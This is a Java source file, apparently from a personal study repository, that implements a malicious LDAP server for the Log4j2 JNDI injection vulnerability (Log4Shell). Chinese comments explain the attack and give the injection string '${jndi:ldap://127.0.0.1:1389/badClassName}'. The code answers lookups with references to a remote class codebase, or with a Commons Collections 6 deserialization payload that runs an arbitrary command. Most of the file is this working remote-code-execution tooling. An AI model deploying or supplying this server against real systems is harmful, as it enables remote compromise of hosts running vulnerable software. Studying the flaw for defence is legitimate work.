package com.yale.test.java.classpath.ldap.server;

import java.net.InetAddress;
import java.net.URL;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

/*
 * https://www.cnblogs.com/yyhuni/p/15091116.html 《Fastjson 1.2.22-24 反序列化漏洞分析（2）》
 * https://www.cnblogs.com/tr1ple/p/12232601.html 《关于<Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）>看后的一些总结-2》
 * https://mp.weixin.qq.com/s/wHUv-lFXBUcPp0uIjvHSaw 《Log4j2 Jndi 漏洞解析、复盘 》
 * 而对于客户端而言，则更加简单，仅需要引用对应的log4j-core的漏洞版即可，当前所引入的为2.14.1的版本。error代码中直接填写：${java.version} 则最终会返回对应的Java版本信息
 * 针对jndi的问题，先做下相关说明：首先jndi本身并不是Log4j2框架的产物，而是Jdk自身的功能，对应的包路径为com.sun.jndi 。
 * https://mp.weixin.qq.com/s/yUsLA5WFYQNw1wu4VTM_JQ 《突发！Log4j 爆“核弹级”漏洞，Flink、Kafka等至少十多个项目受影响》
 * https://logging.apache.org/log4j/2.x/download.html
 * log4j-api-2.15.0.jar
 * log4j-core-2.15.0.jar
 * <dependencies>
  <dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-api</artifactId>
    <version>2.15.0</version>
  </dependency>
  <dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.15.0</version>
  </dependency>
</dependencies>
 * 首先我们当前的注入方式是${jndi:ldap://127.0.0.1:1389/badClassName} 也就是让Log4j2框架执行error时，触发JndiLookup，然后调用JndiLookup的ldap协议，以此达到注入的效果。
 * 那么在此之前，我们需要做的第一件事是先搭建一个ldap协议的服务端，只有这样才能做到Log4j2触发ldap协议时，可以成功访问你当前本地的1389端口，核心代码如下所示：
 * 首先定义一个ldap协议的Server
 * 
 * unboundid-ldapsdk-4.0.9.jar
 * https://github.com/pingidentity/ldapsdk 
 * 本类Ladp.java源码来自github：https://github.com/EmYiQing/LDAPKit/blob/master/src/main/java/org/sec/Ldap.java
 * unboundid-ldapsdk-4.0.9.jar
 */
public class Ldap {
	private static final Logger logger = LogManager.getLogger(Ldap.class);
	private static final String LDAP_BASE = "dc=example,dc=com";
	
	public static void start(boolean cc, String cmd) {
		try {
			int port = 1389;
			String codeBase = "http://0.0.0.0:8000/#badClassName";
			//https://vimsky.com/examples/detail/java-class-com.unboundid.ldap.listener.InMemoryDirectoryServerConfig.html
			InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
			config.setListenerConfigs(new InMemoryListenerConfig("listen", InetAddress.getByName("0.0.0.0"),
					port, ServerSocketFactory.getDefault(),
					SocketFactory.getDefault(),
					(SSLSocketFactory)SSLSocketFactory.getDefault()));
			if (!cc) {
				config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(codeBase)));
			} else {
				logger.error("use commons collections 6 payload");
				byte[] payload = Payload.getCC6(cmd);
				if (payload == null || payload.length == 0) {
					logger.error("build payload error");
					System.exit(0);
				}
				config.addInMemoryOperationInterceptor(new CCInterceptor(payload));
			}
			InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
			logger.error("start ldap server:0.0.0.0:" + port + "cc" + cc);
			ds.startListening();
		} catch (Exception e) {
			e.printStackTrace();
			logger.error("ErrorMessage", e);
		}
	}
	
	/*
	 * 静态内部类的知识点请参考这个类com.yale.test.java.demo.InnerClass.java
	 */
	private static class OperationInterceptor extends InMemoryOperationInterceptor {
		private final URL codebase;
		
		public OperationInterceptor(URL cb) {
			this.codebase = cb;
		}
		
		@Override
		public void processSearchResult(InMemoryInterceptedSearchResult result) {
			String base = result.getRequest().getBaseDN();
			Entry e = new Entry(base);
			try {
				sendResult(result, e);
			} catch(Exception ex) {
				ex.printStackTrace();
				logger.error("ErrorMsg", e);
			}
		}
		
		protected void sendResult(InMemoryInterceptedSearchResult result, Entry e) throws LDAPException {
			e.addAttribute("javaClassName", "test");
			String codeBaseStr = this.codebase.toString();
			int refPos = codeBaseStr.indexOf('#');
			if (refPos > 0) {
				codeBaseStr = codeBaseStr.substring(0, refPos);
			}
			e.addAttribute("javaCodeBase", codeBaseStr);
			e.addAttribute("objectClass", "javaNamingReference");
			e.addAttribute("javaFactory", this.codebase.getRef());
			result.sendSearchEntry(e);
			result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
		}
	}
	
	private static class CCInterceptor extends InMemoryOperationInterceptor {
		private final byte[] payload;
		public CCInterceptor(byte[] payload) {
			this.payload = payload;
		}
		
		@Override
		public void processSearchResult(InMemoryInterceptedSearchResult result) {
			String base = result.getRequest().getBaseDN();
			Entry e = new Entry(base);
			try {
				sendResult(result ,e);
			} catch(Exception ex) {
				ex.printStackTrace();
			}
		}
		
		protected void sendResult(InMemoryInterceptedSearchResult result, Entry e) throws LDAPException {
			e.addAttribute("javaClassName", "java.lang.String");
			e.addAttribute("javaSerializedData", payload);
			result.sendSearchEntry(e);
			result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
		}
	}
}
